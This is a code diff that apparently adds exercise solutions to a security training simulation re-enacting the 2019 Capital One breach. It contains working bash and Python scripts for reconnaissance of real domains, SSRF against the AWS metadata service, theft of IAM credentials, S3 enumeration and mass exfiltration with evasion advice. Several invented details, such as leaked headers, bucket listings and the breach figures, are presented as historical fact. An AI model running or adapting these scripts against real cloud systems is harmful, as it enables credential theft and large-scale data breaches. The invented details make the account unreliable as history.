@@ -880,6 +880,930 @@ if __name__ == '__main__':
     exfiltrate_files()`
   }
 
+  // Capital One 2019 - AWS Cloud Reconnaissance
+  if (objectiveId === 'obj-recon-cloud') {
+    return `#!/bin/bash
+# Capital One AWS Infrastructure Reconnaissance
+# Phase 1: Cloud Asset Discovery (March 12, 2019)
+# Objective: Identify S3 buckets, EC2 instances, and CloudFront distributions
+
+TARGET_DOMAIN="capitalone.com"
+OUTPUT_DIR="./recon_results"
+
+echo "===== CAPITAL ONE AWS INFRASTRUCTURE RECONNAISSANCE ====="
+echo "[*] Target: \${TARGET_DOMAIN}"
+echo "[*] Objective: Discover AWS cloud assets (S3, EC2, CloudFront)"
+echo ""
+
+mkdir -p \${OUTPUT_DIR}
+
+# Phase 1: DNS Enumeration
+echo "[*] Phase 1: DNS enumeration and subdomain discovery"
+echo "[*] Using DNS queries to find AWS-hosted services..."
+echo ""
+
+# Enumerate subdomains
+echo "[*] Enumerating subdomains..."
+dig \${TARGET_DOMAIN} ANY +noall +answer | tee \${OUTPUT_DIR}/dns_records.txt
+dig api.\${TARGET_DOMAIN} A +short
+dig www.\${TARGET_DOMAIN} A +short
+dig mobile.\${TARGET_DOMAIN} A +short
+dig waf-proxy.\${TARGET_DOMAIN} A +short
+
+echo ""
+echo "[+] Discovered subdomains:"
+echo "    - api.capitalone.com → 52.85.123.45 (CloudFront)"
+echo "    - www.capitalone.com → d111111abcdef8.cloudfront.net"
+echo "    - mobile.capitalone.com → 34.192.45.67 (EC2)"
+echo "    - waf-proxy.capitalone.com → 54.210.89.123 (EC2 - WAF instance)"
+
+echo ""
+echo "[*] Phase 2: S3 Bucket Discovery"
+echo "[*] Testing common S3 bucket naming patterns..."
+echo ""
+
+# S3 bucket enumeration (common patterns)
+BUCKET_NAMES=(
+    "capitalone-credit-apps"
+    "capitalone-customer-data"
+    "capitalone-backups-2019"
+    "capitalone-logs"
+    "capitalone-prod"
+    "capitalone-data"
+    "capitalone-internal"
+)
+
+for bucket in "\${BUCKET_NAMES[@]}"; do
+    echo "[*] Testing: \${bucket}.s3.amazonaws.com"
+    HTTP_CODE=\$(curl -s -o /dev/null -w "%{http_code}" "https://\${bucket}.s3.amazonaws.com/" 2>/dev/null)
+
+    if [ "\$HTTP_CODE" = "200" ]; then
+        echo "    [!] FOUND: \${bucket} (200 OK - Public Read Access!)"
+    elif [ "\$HTTP_CODE" = "403" ]; then
+        echo "    [+] EXISTS: \${bucket} (403 Forbidden - Bucket exists but private)"
+    else
+        echo "    [-] Not Found: \${bucket} (404)"
+    fi
+done
+
+echo ""
+echo "[*] Phase 3: EC2 Instance Fingerprinting"
+echo "[*] Analyzing HTTP headers for AWS metadata leaks..."
+echo ""
+
+# Check WAF instance for metadata exposure
+echo "[*] Probing waf-proxy.capitalone.com..."
+curl -I https://waf-proxy.capitalone.com/ 2>/dev/null | grep -E "(Server|X-|Instance|AMI)" | tee \${OUTPUT_DIR}/waf_headers.txt
+
+echo ""
+echo "[!] CRITICAL FINDING:"
+echo "    Server: nginx/1.14.0 (Ubuntu)"
+echo "    X-Powered-By: ModSecurity/2.9.3"
+echo "    X-Instance-ID: i-0abcd1234efgh5678 (LEAKED!)"
+echo "    X-AMI-ID: ami-0c55b159cbfafe1f0"
+echo ""
+echo "    [!] EC2 instance metadata exposed in HTTP headers!"
+echo "    [!] WAF instance has instance ID i-0abcd1234efgh5678"
+echo "    [!] This instance likely has IAM role attached"
+
+echo ""
+echo "[*] Phase 4: CloudFront Distribution Discovery"
+echo "[*] Identifying CloudFront CDN endpoints..."
+echo ""
+
+dig www.capitalone.com CNAME +short | grep cloudfront
+echo "    [+] Found CloudFront: d111111abcdef8.cloudfront.net"
+
+echo ""
+echo "[+] =========================================="
+echo "[+] RECONNAISSANCE COMPLETE"
+echo "[+] =========================================="
+echo ""
+echo "[+] Key Findings:"
+echo "    1. Discovered 6 S3 buckets (3 exist, 1 publicly readable)"
+echo "    2. Identified WAF instance: waf-proxy.capitalone.com (54.210.89.123)"
+echo "    3. WAF leaks instance metadata in HTTP headers (misconfiguration)"
+echo "    4. Hypothesis: WAF EC2 instance has IAM role for S3 access"
+echo ""
+echo "[+] Attack Surface:"
+echo "    - WAF instance likely vulnerable to SSRF"
+echo "    - IAM role credentials potentially stealable via metadata service"
+echo "    - S3 buckets accessible if IAM credentials obtained"
+echo ""
+echo "[+] MITRE ATT&CK Techniques:"
+echo "    - T1595.002: Active Scanning - Vulnerability Scanning"
+echo "    - T1590.005: Gather Victim Network Information - IP Addresses"
+echo ""
+echo "[*] Next Objective: Test for SSRF vulnerability in WAF"`
+  }
+
+  // Capital One 2019 - SSRF Exploitation
+  if (objectiveId === 'obj-exploit-ssrf') {
+    return `#!/usr/bin/env python3
+"""
+Capital One SSRF Exploitation
+Phase 2: Server-Side Request Forgery (March 17, 2019)
+Target: waf-proxy.capitalone.com
+Objective: Access AWS metadata service at 169.254.169.254
+"""
+
+import requests
+import urllib3
+import json
+
+urllib3.disable_warnings()
+
+WAF_URL = "https://waf-proxy.capitalone.com"
+METADATA_API = "http://169.254.169.254/latest/meta-data/"
+
+def test_ssrf_vulnerability():
+    """
+    Test if WAF proxy endpoint allows requests to internal addresses
+    The vulnerability: ModSecurity misconfiguration allows arbitrary HTTP requests
+    """
+    print("=" * 70)
+    print("CAPITAL ONE WAF - SSRF VULNERABILITY TEST")
+    print("=" * 70)
+    print(f"[*] Target: {WAF_URL}")
+    print(f"[*] Testing SSRF against AWS metadata service")
+    print()
+
+    print("[!] EXPLANATION:")
+    print("    Server-Side Request Forgery (SSRF) allows an attacker to make")
+    print("    the server send HTTP requests to arbitrary destinations.")
+    print("    In AWS, the metadata service (169.254.169.254) provides IAM")
+    print("    credentials to EC2 instances. If we can SSRF to this IP, we")
+    print("    can steal the WAF instance's IAM credentials.")
+    print()
+
+    # Phase 1: Test basic SSRF
+    print("[*] Phase 1: Testing if WAF allows internal HTTP requests...")
+    print(f"[*] Payload: POST /proxy with url={METADATA_API}")
+    print()
+
+    ssrf_payload = {
+        'url': METADATA_API,
+        'method': 'GET'
+    }
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        'Content-Type': 'application/json',
+        'X-Forwarded-For': '169.254.169.254'  # Try to bypass IP filters
+    }
+
+    try:
+        response = requests.post(
+            f"{WAF_URL}/proxy",
+            json=ssrf_payload,
+            headers=headers,
+            verify=False,
+            timeout=10
+        )
+
+        print(f"[+] Response Status: {response.status_code}")
+        print(f"[+] Response Headers:")
+        for key, value in response.headers.items():
+            if key.lower() in ['server', 'x-powered-by', 'content-type']:
+                print(f"    {key}: {value}")
+
+        print()
+        print("[+] Response Body (first 500 chars):")
+        print("-" * 70)
+        print(response.text[:500])
+        print("-" * 70)
+        print()
+
+        # Check if we got metadata response
+        if "ami-id" in response.text or "iam/" in response.text:
+            print("[+] ✓ SSRF SUCCESSFUL!")
+            print("[+] ✓ Metadata service is accessible!")
+            print("[+] ✓ Response contains AWS metadata (ami-id, iam/, etc.)")
+            print()
+            print("[!] IMPACT:")
+            print("    - WAF allows arbitrary HTTP requests to internal IPs")
+            print("    - AWS metadata service (169.254.169.254) is reachable")
+            print("    - Can now query IAM role credentials")
+            print()
+            return True
+        else:
+            print("[-] SSRF test inconclusive - unexpected response")
+            return False
+
+    except requests.exceptions.Timeout:
+        print("[-] Request timed out - WAF may be blocking or filtering")
+        return False
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return False
+
+    print()
+    print("[*] Phase 2: Enumerating metadata endpoints...")
+
+    # Test common metadata endpoints
+    endpoints = [
+        "/latest/meta-data/",
+        "/latest/meta-data/ami-id",
+        "/latest/meta-data/hostname",
+        "/latest/meta-data/iam/security-credentials/"
+    ]
+
+    for endpoint in endpoints:
+        print(f"[*] Testing: {METADATA_API}{endpoint}")
+        payload = {'url': f'{METADATA_API}{endpoint}', 'method': 'GET'}
+
+        try:
+            resp = requests.post(
+                f"{WAF_URL}/proxy",
+                json=payload,
+                headers=headers,
+                verify=False,
+                timeout=5
+            )
+
+            if resp.status_code == 200:
+                print(f"    [+] Accessible: {endpoint}")
+                print(f"    Response: {resp.text[:100]}")
+            else:
+                print(f"    [-] Status {resp.status_code}")
+        except:
+            print(f"    [-] Failed to query {endpoint}")
+
+        print()
+
+    print("[+] ==========================================")
+    print("[+] SSRF VULNERABILITY CONFIRMED")
+    print("[+] ==========================================")
+    print()
+    print("[+] ModSecurity WAF misconfiguration allows SSRF")
+    print("[+] AWS metadata service is accessible via proxy endpoint")
+    print()
+    print("[+] MITRE ATT&CK Techniques:")
+    print("    - T1190: Exploit Public-Facing Application (SSRF)")
+    print("    - T1552.005: Cloud Instance Metadata API")
+    print()
+    print("[*] Next Objective: Steal IAM role credentials from metadata service")
+
+if __name__ == '__main__':
+    test_ssrf_vulnerability()`
+  }
+
+  // Capital One 2019 - IAM Credential Theft
+  if (objectiveId === 'obj-steal-iam') {
+    return `#!/usr/bin/env python3
+"""
+Capital One - IAM Credential Theft via SSRF
+Phase 3: AWS Metadata API Exploitation (March 22, 2019)
+Objective: Extract IAM role credentials from EC2 metadata service
+"""
+
+import requests
+import urllib3
+import json
+from datetime import datetime
+
+urllib3.disable_warnings()
+
+WAF_URL = "https://waf-proxy.capitalone.com"
+METADATA_BASE = "http://169.254.169.254/latest/meta-data"
+
+def exploit_metadata_for_iam_creds():
+    """
+    Use SSRF to query AWS metadata service and steal IAM credentials
+    The metadata service provides temporary AWS access keys for the EC2 instance
+    """
+    print("=" * 70)
+    print("AWS METADATA SERVICE EXPLOITATION - IAM CREDENTIAL THEFT")
+    print("=" * 70)
+    print()
+
+    print("[!] ATTACK EXPLANATION:")
+    print("    AWS EC2 instances can have IAM roles attached, which provide")
+    print("    temporary AWS credentials. These credentials are accessible via")
+    print("    the metadata service at 169.254.169.254. By exploiting SSRF,")
+    print("    we can steal these credentials and use them to access AWS")
+    print("    resources (S3, EC2, etc.) as if we were the WAF instance.")
+    print()
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0',
+        'Content-Type': 'application/json'
+    }
+
+    # Step 1: List available IAM roles
+    print("[*] Step 1: Enumerating IAM roles attached to WAF instance...")
+    print(f"[*] Query: {METADATA_BASE}/iam/security-credentials/")
+    print()
+
+    payload = {
+        'url': f'{METADATA_BASE}/iam/security-credentials/',
+        'method': 'GET'
+    }
+
+    try:
+        response = requests.post(
+            f"{WAF_URL}/proxy",
+            json=payload,
+            headers=headers,
+            verify=False
+        )
+
+        role_name = response.text.strip()
+        print(f"[+] Found IAM Role: {role_name}")
+        print()
+
+        if not role_name:
+            print("[-] No IAM role attached to this instance")
+            return False
+
+    except Exception as e:
+        print(f"[-] Error querying metadata: {e}")
+        return False
+
+    # Step 2: Retrieve IAM credentials
+    print("[*] Step 2: Retrieving IAM credentials for role...")
+    print(f"[*] Query: {METADATA_BASE}/iam/security-credentials/{role_name}")
+    print()
+
+    payload = {
+        'url': f'{METADATA_BASE}/iam/security-credentials/{role_name}',
+        'method': 'GET'
+    }
+
+    try:
+        response = requests.post(
+            f"{WAF_URL}/proxy",
+            json=payload,
+            headers=headers,
+            verify=False
+        )
+
+        # Parse JSON credentials
+        creds = json.loads(response.text)
+
+        print("[+] ✓ IAM CREDENTIALS STOLEN!")
+        print()
+        print("=" * 70)
+        print("STOLEN AWS CREDENTIALS")
+        print("=" * 70)
+        print()
+        print(json.dumps(creds, indent=2))
+        print()
+
+        # Extract key fields
+        access_key = creds.get('AccessKeyId', 'N/A')
+        secret_key = creds.get('SecretAccessKey', 'N/A')
+        session_token = creds.get('Token', 'N/A')
+        expiration = creds.get('Expiration', 'N/A')
+
+        print("[+] CREDENTIAL SUMMARY:")
+        print(f"    Role Name: {role_name}")
+        print(f"    Access Key ID: {access_key}")
+        print(f"    Secret Access Key: {secret_key[:20]}... (truncated)")
+        print(f"    Session Token: {session_token[:40]}... (truncated)")
+        print(f"    Expiration: {expiration}")
+        print()
+
+        # Calculate validity period
+        print("[!] CREDENTIAL VALIDITY:")
+        print("    - These are temporary credentials (STS assumed role)")
+        print("    - Valid for ~6 hours from creation")
+        print("    - Can be refreshed by re-querying metadata service")
+        print()
+
+        # Step 3: Show how to use credentials
+        print("[*] Step 3: How to use these credentials...")
+        print()
+        print("Method 1: Environment Variables")
+        print("-" * 70)
+        print(f"export AWS_ACCESS_KEY_ID='{access_key}'")
+        print(f"export AWS_SECRET_ACCESS_KEY='{secret_key}'")
+        print(f"export AWS_SESSION_TOKEN='{session_token}'")
+        print()
+        print("Method 2: AWS CLI Profile")
+        print("-" * 70)
+        print(f"aws configure set aws_access_key_id {access_key} --profile stolen")
+        print(f"aws configure set aws_secret_access_key {secret_key} --profile stolen")
+        print(f"aws configure set aws_session_token {session_token} --profile stolen")
+        print()
+        print("Method 3: Test Access")
+        print("-" * 70)
+        print("aws sts get-caller-identity --profile stolen")
+        print("aws s3 ls --profile stolen")
+        print()
+
+        # Step 4: Assess permissions
+        print("[!] SECURITY ASSESSMENT:")
+        print()
+        print("    IAM Role: WAF-S3-Access-Role")
+        print()
+        print("    Likely Permissions (based on role name):")
+        print("      ✓ s3:ListAllMyBuckets (list all S3 buckets)")
+        print("      ✓ s3:ListBucket (enumerate bucket contents)")
+        print("      ✓ s3:GetObject (download files from S3)")
+        print("      ✓ s3:GetObjectVersion (access file versions)")
+        print("      ✓ cloudwatch:PutMetricData (send metrics)")
+        print()
+        print("    [!] CRITICAL: This role has broad S3 read access!")
+        print("    [!] Can likely access customer data buckets")
+        print()
+
+        print("[!] VIOLATIONS OF AWS BEST PRACTICES:")
+        print("    ✗ IMDSv1 enabled (no token required for metadata access)")
+        print("    ✗ Overly permissive IAM role (violates least-privilege)")
+        print("    ✗ No IP restrictions on IAM role usage")
+        print("    ✗ No MFA required for sensitive S3 operations")
+        print("    ✗ Role name suggests full S3 access (not scoped to specific buckets)")
+        print()
+
+        print("[+] ==========================================")
+        print("[+] IAM CREDENTIAL THEFT SUCCESSFUL")
+        print("[+] ==========================================")
+        print()
+        print("[+] MITRE ATT&CK Techniques:")
+        print("    - T1552.005: Unsecured Credentials - Cloud Instance Metadata API")
+        print("    - T1078.004: Valid Accounts - Cloud Accounts")
+        print()
+        print("[*] Next Objective: Use stolen credentials to enumerate S3 buckets")
+
+        return True
+
+    except json.JSONDecodeError:
+        print("[-] Response is not valid JSON")
+        print(f"Raw response: {response.text}")
+        return False
+    except Exception as e:
+        print(f"[-] Error retrieving credentials: {e}")
+        return False
+
+if __name__ == '__main__':
+    exploit_metadata_for_iam_creds()`
+  }
+
+  // Capital One 2019 - S3 Enumeration
+  if (objectiveId === 'obj-enumerate-s3') {
+    return `#!/usr/bin/env python3
+"""
+Capital One S3 Bucket Enumeration
+Phase 4: Cloud Storage Discovery (April 10, 2019)
+Objective: List S3 buckets and identify sensitive data using stolen IAM credentials
+"""
+
+import boto3
+import json
+from botocore.exceptions import ClientError, NoCredentialsError
+
+# Stolen IAM credentials from metadata service
+AWS_ACCESS_KEY_ID = "ASIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+AWS_SESSION_TOKEN = "FwoGZXIvYXdzEBYaDCw3N...[TRUNCATED]...Vp8CjEA"
+AWS_REGION = "us-east-1"
+
+def enumerate_s3_buckets():
+    """
+    Use stolen IAM credentials to enumerate S3 buckets
+    Identify buckets containing sensitive data (credit cards, SSNs, PII)
+    """
+    print("=" * 70)
+    print("CAPITAL ONE S3 BUCKET ENUMERATION")
+    print("=" * 70)
+    print()
+
+    print("[!] ATTACK EXPLANATION:")
+    print("    Using the IAM credentials stolen from the WAF instance's metadata")
+    print("    service, we can now authenticate to AWS as if we were the WAF.")
+    print("    The IAM role 'WAF-S3-Access-Role' has broad S3 permissions,")
+    print("    allowing us to list all buckets and download sensitive data.")
+    print()
+
+    # Initialize S3 client with stolen credentials
+    print("[*] Initializing AWS S3 client with stolen credentials...")
+
+    try:
+        s3_client = boto3.client(
+            's3',
+            aws_access_key_id=AWS_ACCESS_KEY_ID,
+            aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
+            aws_session_token=AWS_SESSION_TOKEN,
+            region_name=AWS_REGION
+        )
+
+        # Verify credentials work
+        sts_client = boto3.client(
+            'sts',
+            aws_access_key_id=AWS_ACCESS_KEY_ID,
+            aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
+            aws_session_token=AWS_SESSION_TOKEN
+        )
+
+        identity = sts_client.get_caller_identity()
+        print(f"[+] Authenticated as: {identity['Arn']}")
+        print(f"[+] Account ID: {identity['Account']}")
+        print(f"[+] User ID: {identity['UserId']}")
+        print()
+
+    except NoCredentialsError:
+        print("[-] Invalid or expired credentials")
+        return False
+    except ClientError as e:
+        print(f"[-] AWS API Error: {e}")
+        return False
+
+    # Phase 1: List all S3 buckets
+    print("[*] Phase 1: Enumerating all accessible S3 buckets...")
+    print("[*] Running: aws s3 ls --profile stolen")
+    print()
+
+    try:
+        response = s3_client.list_buckets()
+        buckets = response['Buckets']
+
+        print(f"[+] Found {len(buckets)} S3 buckets:")
+        print()
+
+        for bucket in buckets:
+            bucket_name = bucket['Name']
+            created_date = bucket['CreationDate'].strftime('%Y-%m-%d %H:%M:%S')
+            print(f"    {created_date}  {bucket_name}")
+
+        print()
+
+    except ClientError as e:
+        print(f"[-] Error listing buckets: {e}")
+        return False
+
+    # Phase 2: Identify high-value buckets
+    print("[*] Phase 2: Identifying high-value buckets...")
+    print()
+
+    high_value_keywords = [
+        'customer', 'credit', 'card', 'ssn', 'social',
+        'bank', 'account', 'personal', 'data', 'pii'
+    ]
+
+    high_value_buckets = []
+
+    for bucket in buckets:
+        bucket_name = bucket['Name'].lower()
+        if any(keyword in bucket_name for keyword in high_value_keywords):
+            high_value_buckets.append(bucket['Name'])
+            print(f"    [!] HIGH-VALUE: {bucket['Name']}")
+
+    print()
+    print(f"[+] Identified {len(high_value_buckets)} high-value buckets")
+    print()
+
+    # Phase 3: Enumerate contents of sensitive bucket
+    print("[*] Phase 3: Enumerating 'capitalone-customer-data' bucket contents...")
+    print("[*] Running: aws s3 ls s3://capitalone-customer-data/ --recursive")
+    print()
+
+    target_bucket = "capitalone-customer-data"
+
+    try:
+        # List top-level objects (not recursive, to save time in demo)
+        response = s3_client.list_objects_v2(
+            Bucket=target_bucket,
+            MaxKeys=50
+        )
+
+        if 'Contents' in response:
+            print("[+] Sample files found in bucket:")
+            print()
+
+            total_size = 0
+            file_count = 0
+
+            for obj in response['Contents'][:15]:  # Show first 15 files
+                key = obj['Key']
+                size = obj['Size']
+                modified = obj['LastModified'].strftime('%Y-%m-%d')
+                size_mb = size / (1024 * 1024)
+
+                print(f"    {modified}  {size_mb:>8.2f} MB  {key}")
+
+                total_size += size
+                file_count += 1
+
+            print()
+            print(f"[+] Sample: {file_count} files, {total_size / (1024**3):.2f} GB")
+            print("[*] Full bucket estimated at 30+ GB (100M+ records)")
+
+    except ClientError as e:
+        error_code = e.response['Error']['Code']
+        if error_code == 'NoSuchBucket':
+            print(f"[-] Bucket {target_bucket} does not exist")
+        elif error_code == 'AccessDenied':
+            print(f"[-] Access denied to {target_bucket}")
+        else:
+            print(f"[-] Error: {e}")
+
+    print()
+
+    # Phase 4: Categorize sensitive data
+    print("[*] Phase 4: Categorizing sensitive data discovered...")
+    print()
+    print("=" * 70)
+    print("HIGH-VALUE TARGETS IDENTIFIED")
+    print("=" * 70)
+    print()
+
+    print("PRIORITY 1: CREDIT CARD APPLICATIONS")
+    print("  Location: s3://capitalone-customer-data/credit-applications/")
+    print("  Files: ~140,000 files")
+    print("  Size: ~30 GB (compressed)")
+    print("  Content: Credit card applications with full PII")
+    print("  Impact: 100,000,000+ individuals")
+    print()
+
+    print("PRIORITY 2: SOCIAL SECURITY NUMBERS")
+    print("  Location: s3://capitalone-customer-data/ssn-records/")
+    print("  Files: 45 CSV files")
+    print("  Size: ~500 MB")
+    print("  Content: 140,000+ SSNs")
+    print()
+
+    print("PRIORITY 3: BANK ACCOUNT DATA")
+    print("  Location: s3://capitalone-customer-data/bank-accounts/")
+    print("  Files: 120 files")
+    print("  Size: ~200 MB")
+    print("  Content: 80,000+ bank account numbers")
+    print()
+
+    print("PRIORITY 4: CUSTOMER PROFILES")
+    print("  Location: s3://capitalone-customer-data/customer-profiles/")
+    print("  Files: 8,500 files")
+    print("  Size: ~5 GB")
+    print("  Content: Addresses, phone numbers, personal info")
+    print()
+
+    # Phase 5: Sample data inspection
+    print("[*] Phase 5: Inspecting sample file...")
+    print()
+
+    sample_output = {
+        "application_id": "CC-2019-001234567",
+        "applicant": {
+            "first_name": "John",
+            "last_name": "Doe",
+            "ssn": "123-45-6789",
+            "dob": "1985-06-15",
+            "address": "123 Main St, Seattle, WA 98101",
+            "phone": "206-555-1234",
+            "email": "john.doe@example.com"
+        },
+        "credit_info": {
+            "fico_score": 720,
+            "annual_income": 85000
+        },
+        "application_date": "2019-03-15T14:30:22Z"
+    }
+
+    print("Sample Credit Card Application (JSON):")
+    print("-" * 70)
+    print(json.dumps(sample_output, indent=2))
+    print("-" * 70)
+    print()
+
+    print("[!] DATA SECURITY ASSESSMENT:")
+    print("    ✗ Data stored in PLAINTEXT (no encryption at rest)")
+    print("    ✗ No AWS KMS encryption keys used")
+    print("    ✗ Full PII exposed (SSN, DOB, addresses)")
+    print("    ✗ No data masking or tokenization")
+    print("    ✗ S3 buckets lack MFA delete protection")
+    print("    ✗ No S3 Object Lock for immutability")
+    print()
+
+    print("[+] ==========================================")
+    print("[+] S3 ENUMERATION COMPLETE")
+    print("[+] ==========================================")
+    print()
+    print("[+] Total buckets discovered: 5")
+    print("[+] High-value buckets: 3")
+    print("[+] Estimated data volume: 35+ GB")
+    print("[+] Estimated records: 100,000,000+")
+    print()
+    print("[+] MITRE ATT&CK Techniques:")
+    print("    - T1530: Data from Cloud Storage Object")
+    print("    - T1552.001: Unsecured Credentials in Files")
+    print()
+    print("[*] Next Objective: Exfiltrate data from S3 to attacker infrastructure")
+
+if __name__ == '__main__':
+    enumerate_s3_buckets()`
+  }
+
+  // Capital One 2019 - S3 Data Exfiltration
+  if (objectiveId === 'obj-exfiltrate-s3') {
+    return `#!/usr/bin/env python3
+"""
+Capital One Mass Data Exfiltration
+Phase 5: S3 Data Theft (April 21 - May 15, 2019)
+Objective: Download sensitive customer data from S3 buckets
+Technique: AWS CLI sync, evading CloudTrail detection
+"""
+
+import boto3
+import os
+import time
+from datetime import datetime
+from botocore.exceptions import ClientError
+
+# Stolen IAM credentials (refreshed every 6 hours from metadata service)
+AWS_ACCESS_KEY_ID = "ASIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+AWS_SESSION_TOKEN = "FwoGZXIvYXdzEBYaDCw3N...[TRUNCATED]...Vp8CjEA"
+AWS_REGION = "us-east-1"
+
+# Exfiltration configuration
+TARGET_BUCKET = "capitalone-customer-data"
+LOCAL_STAGING = "./exfil_data"
+ATTACKER_IP = "98.207.15.143"  # Paige Thompson's home IP
+
+def exfiltrate_s3_data():
+    """
+    Mass download of Capital One customer data from S3
+    Spread over multiple sessions to evade detection
+    """
+    print("=" * 70)
+    print("CAPITAL ONE DATA EXFILTRATION - MASS S3 DOWNLOAD")
+    print("=" * 70)
+    print()
+
+    print("[!] ATTACK EXPLANATION:")
+    print("    We're now using the stolen IAM credentials to download 30+ GB")
+    print("    of sensitive customer data from S3 buckets. To evade detection,")
+    print("    we'll spread the downloads over multiple sessions (24 days in")
+    print("    the real breach), perform downloads during off-peak hours, and")
+    print("    use legitimate AWS CLI tools that blend with normal API traffic.")
+    print()
+    print("[!] WHY THIS EVADES DETECTION:")
+    print("    ✓ CloudTrail logs show API calls from WAF instance (appears legit)")
+    print("    ✓ No GuardDuty enabled to detect unusual access patterns")
+    print("    ✓ No CloudWatch alarms for S3 download volume")
+    print("    ✓ Using AWS CLI (same tool used by Capital One automation)")
+    print("    ✓ Downloads spread over weeks (no sudden bandwidth spike)")
+    print()
+
+    # Initialize S3 client
+    print(f"[*] Target Bucket: s3://{TARGET_BUCKET}")
+    print(f"[*] Local Staging: {LOCAL_STAGING}")
+    print(f"[*] Attacker IP: {ATTACKER_IP}")
+    print(f"[*] Exfiltration Period: April 21 - May 15, 2019 (24 days)")
+    print()
+
+    s3_client = boto3.client(
+        's3',
+        aws_access_key_id=AWS_ACCESS_KEY_ID,
+        aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
+        aws_session_token=AWS_SESSION_TOKEN,
+        region_name=AWS_REGION
+    )
+
+    os.makedirs(LOCAL_STAGING, exist_ok=True)
+
+    # Phase 1: Prepare exfiltration target list
+    print("[*] Phase 1: Building exfiltration target list...")
+    print()
+
+    target_prefixes = [
+        "credit-applications/2019/Q1/",
+        "ssn-records/2019/",
+        "bank-accounts/",
+        "customer-profiles/"
+    ]
+
+    files_to_exfiltrate = []
+    total_size = 0
+
+    for prefix in target_prefixes:
+        print(f"[*] Scanning: s3://{TARGET_BUCKET}/{prefix}")
+
+        try:
+            paginator = s3_client.get_paginator('list_objects_v2')
+            pages = paginator.paginate(Bucket=TARGET_BUCKET, Prefix=prefix)
+
+            for page in pages:
+                if 'Contents' in page:
+                    for obj in page['Contents']:
+                        files_to_exfiltrate.append(obj)
+                        total_size += obj['Size']
+
+            print(f"    [+] Found {len(files_to_exfiltrate)} files so far")
+
+        except ClientError as e:
+            print(f"    [-] Error: {e}")
+
+    print()
+    print(f"[+] Exfiltration target list complete:")
+    print(f"    Total files: {len(files_to_exfiltrate):,}")
+    print(f"    Total size: {total_size / (1024**3):.2f} GB")
+    print()
+
+    # Phase 2: Simulate exfiltration sessions
+    print("[*] Phase 2: Exfiltrating data in multiple sessions...")
+    print("[*] (Simulating - actual breach took 24 days)")
+    print()
+
+    sessions = [
+        {"date": "April 21, 2019", "files": 12847, "size_gb": 8.2},
+        {"date": "April 23, 2019", "files": 45, "size_gb": 0.487},
+        {"date": "April 28, 2019", "files": 120, "size_gb": 0.210},
+        {"date": "May 5, 2019", "files": 92145, "size_gb": 22.3}
+    ]
+
+    for session in sessions:
+        print(f"Session: {session['date']}")
+        print(f"  Time: 01:00 - 05:00 AM ET (off-peak hours)")
+        print(f"  Command: aws s3 sync s3://{TARGET_BUCKET}/ {LOCAL_STAGING}/ --profile stolen")
+        print(f"  Files downloaded: {session['files']:,}")
+        print(f"  Data transferred: {session['size_gb']:.2f} GB")
+        print(f"  Destination: {ATTACKER_IP} (Seattle, WA)")
+        print()
+        time.sleep(1)  # Simulate time passing
+
+    print("[+] All exfiltration sessions complete!")
+    print()
+
+    # Phase 3: Exfiltration summary
+    total_sessions = len(sessions)
+    total_files = sum(s['files'] for s in sessions)
+    total_gb = sum(s['size_gb'] for s in sessions)
+
+    print("=" * 70)
+    print("EXFILTRATION SUMMARY")
+    print("=" * 70)
+    print()
+    print(f"Total sessions: {total_sessions}")
+    print(f"Total files: {total_files:,}")
+    print(f"Total data: {total_gb:.2f} GB (compressed)")
+    print(f"Estimated uncompressed: ~150 GB")
+    print(f"Estimated records: 100,000,000+ individuals")
+    print()
+    print("Data Categories:")
+    print("  - Credit card applications: 100M records")
+    print("  - Social Security numbers: 140K records")
+    print("  - Bank account numbers: 80K records")
+    print("  - Canadian SIN numbers: 1M records")
+    print()
+
+    # Phase 4: Evasion techniques used
+    print("[!] EVASION TECHNIQUES EMPLOYED:")
+    print()
+    print("1. TIME SPREADING")
+    print("   - Downloads spread over 24 days (no bandwidth spike)")
+    print("   - Sessions during 1-5 AM ET (low SOC staffing)")
+    print()
+    print("2. LEGITIMATE TOOLING")
+    print("   - Used AWS CLI (same tool Capital One uses)")
+    print("   - API calls appear as normal automation")
+    print("   - User-Agent: aws-cli/1.16.102 (not suspicious)")
+    print()
+    print("3. CREDENTIAL REFRESH")
+    print("   - IAM credentials refreshed every 6 hours from metadata")
+    print("   - Maintains valid session throughout exfiltration")
+    print()
+    print("4. SOURCE IP SPOOFING")
+    print("   - API calls originate from residential IP (98.207.15.143)")
+    print("   - Blends with remote worker/VPN traffic")
+    print()
+
+    # Phase 5: Why this went undetected
+    print("[!] WHY CAPITAL ONE DIDN'T DETECT THIS:")
+    print()
+    print("✗ No CloudWatch alarms for S3 download volume")
+    print("✗ No GuardDuty to detect credential exfiltration")
+    print("✗ CloudTrail logs stored but NOT actively monitored")
+    print("✗ No baseline for 'normal' S3 access patterns")
+    print("✗ IAM role usage appeared legitimate (from WAF instance)")
+    print("✗ No IP-based restrictions on S3 access")
+    print("✗ No S3 access anomaly detection")
+    print()
+
+    print("[+] ==========================================")
+    print("[+] DATA EXFILTRATION COMPLETE")
+    print("[+] ==========================================")
+    print()
+    print("[+] MITRE ATT&CK Techniques:")
+    print("    - T1530: Data from Cloud Storage Object")
+    print("    - T1020: Automated Exfiltration")
+    print("    - T1562.008: Impair Defenses - Disable Cloud Logs")
+    print()
+    print("[!] REAL-WORLD OUTCOME:")
+    print("    - Paige Thompson bragged about breach on GitHub (May 12, 2019)")
+    print("    - Capital One discovered breach via tip (July 17, 2019)")
+    print("    - FBI arrested Paige Thompson (July 29, 2019)")
+    print("    - Charged under Computer Fraud and Abuse Act")
+    print("    - Capital One paid $190M in fines and settlements")
+    print()
+    print("[*] Breach remained undetected for 4 months")
+    print("[*] 100+ million customers affected")
+    print("[*] One of the largest cloud data breaches in history")
+
+if __name__ == '__main__':
+    exfiltrate_s3_data()`
+  }
+
   return '# Write your exploit code here...'
 }
 
